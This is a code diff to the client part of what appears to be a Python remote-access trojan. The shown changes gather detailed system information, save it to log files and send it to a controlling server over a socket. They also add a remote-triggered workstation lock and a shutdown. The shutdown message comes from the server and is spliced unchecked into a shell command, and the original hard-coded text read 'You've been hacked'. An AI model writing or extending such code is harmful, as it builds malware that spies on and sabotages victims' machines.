@@ -91,10 +91,6 @@ class Client:
 
         return full
 
-
-
-
-
     def sendHostInfo(self):
         """ Extracting host information """
 
@@ -102,23 +98,23 @@ class Client:
         self.client.send(host.encode("utf-8"))
         # Make a Dictionary
         sys_info = {
-                    "Platform": platform.system(),
-                    "Platform Release": platform.release(),
-                    "Platform Version": platform.version(),
-                    "Platform Architecture": platform.architecture(),
-                    "Machine Type": platform.machine(),
-                    "Platform Node": platform.node(),
-                    "Platform Information": platform.platform(),
-                    "ALL": platform.uname(),
-                    "HostName": socket.gethostname(),
-                    "Host IP_Address": socket.gethostbyname(socket.gethostname()),
-                    "CPU": platform.processor(),
-                    "Python Build": platform.python_build(),
-                    "Python Compiler": platform.python_compiler(),
-                    "Python Version": platform.python_version(),
-                    "Windows Platform": platform.win32_ver()
-                  #  "OS": os.uname() # os.uname() ONLY SUPPORTED ON LINUX
-                   }
+            "Platform": platform.system(),
+            "Platform Release": platform.release(),
+            "Platform Version": platform.version(),
+            "Platform Architecture": platform.architecture(),
+            "Machine Type": platform.machine(),
+            "Platform Node": platform.node(),
+            "Platform Information": platform.platform(),
+            "ALL": platform.uname(),
+            "HostName": socket.gethostname(),
+            "Host IP_Address": socket.gethostbyname(socket.gethostname()),
+            "CPU": platform.processor(),
+            "Python Build": platform.python_build(),
+            "Python Compiler": platform.python_compiler(),
+            "Python Version": platform.python_version(),
+            "Windows Platform": platform.win32_ver()
+            #  "OS": os.uname() # os.uname() ONLY SUPPORTED ON LINUX
+        }
         # https://www.geeksforgeeks.org/platform-module-in-python/#:~:text=Python%20defines%20an%20in%2Dbuilt,program%20is%20being%20currently%20executed.
         cpu = platform.processor()
         system = platform.system()
@@ -126,8 +122,7 @@ class Client:
 
         with open('./logs/info.txt', 'w+') as f:
             for k, v in sys_info.items():
-                f.write(str(k) + ' >>> ' + str(v) + '\n')
-                print(str(k) + ' >>> ' + str(v) + '\n')
+                f.write(str(k) + ' >>> ' + str(v) + '\n\n')
 
         with open('./logs/info.txt', 'rb+') as f:
             self.client.send(f.read())
@@ -135,9 +130,9 @@ class Client:
         input()
         pprint(sys_info)
         input()
-        self.sysinfViaCMD()
+        self.sysinfViaCMDFile()
 
-    def sysinfViaCMD(self):
+    def sysinfViaCMDFile(self):
         # traverse the info
         Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
         new = []
@@ -145,11 +140,20 @@ class Client:
         # arrange the string into clear info
         for item in Id:
             new.append(str(item.split("\r")[:-1]))
-        for i in new:
-            print(i[2:-2])
+        with open("./logs/moreinfoC.txt", "w+") as f:
+            for i in new:
+                print(i[2:-2])
+                f.write(i[2:-2] + "\n")
+        with open('./logs/moreinfoC.txt', 'rb+') as f:
+            # self.client.send(os.path.getsize('./logs/moreinfoC.txt').encode())
+            c = f.read()
+            print(len(c))
+            time.sleep(1)
+            self.client.send((str(len(c))).encode())
+            time.sleep(10)
+            self.client.send(c)
 
-
-# ''' WINDOWS FUNCTIONS '''
+    # ''' WINDOWS FUNCTIONS '''
     def locksystem(self):
         msg = "rundll32.exe user32.dll, LockWorkStation"
         self.runrun(msg)
@@ -162,7 +166,9 @@ class Client:
         self.locksystem()
 
     def shutdownmessage(self):
-        msg = "shutdown /s /e 'You've been hacked '"
+        message = self.client.recv(self.BUFFER_SIZE).decode()
+        msg = "shutdown /s /e '" + message + "' "
+        # msg = "shutdown /s /e 'You've been hacked '"
         self.runrun(msg)
         self.client.send(("[+] PC SHUTDOWN WITH MESSAGE." + msg).encode("utf-8"))
 
